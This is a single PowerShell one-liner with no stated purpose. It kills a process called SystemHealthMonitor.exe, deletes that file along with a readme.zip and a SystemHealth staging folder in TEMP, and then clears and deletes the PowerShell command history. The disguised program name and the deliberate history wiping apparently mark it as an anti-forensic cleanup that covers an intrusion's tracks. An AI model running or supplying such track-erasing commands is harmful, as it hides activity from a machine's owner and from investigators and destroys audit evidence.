taskkill /f /im SystemHealthMonitor.exe; $workingDir="$env:TEMP\SystemHealth"; $zipPath="$workingDir\readme.zip"; $documentsExe=Join-Path ([Environment]::GetFolderPath("MyDocuments")) "SystemHealthMonitor.exe"; if(Test-Path $documentsExe){Remove-Item $documentsExe -Force; Write-Output "Deleted: $documentsExe"}else{Write-Output "Not found: $documentsExe"}; if(Test-Path $zipPath){Remove-Item $zipPath -Force; Write-Output "Deleted: $zipPath"}else{Write-Output "Not found: $zipPath"}; if(Test-Path $workingDir){Remove-Item $workingDir -Recurse -Force; Write-Output "Deleted folder: $workingDir"}else{Write-Output "Not found: $workingDir"}; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); $histPath="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; if(Test-Path $histPath){Remove-Item $histPath -Force}; exit
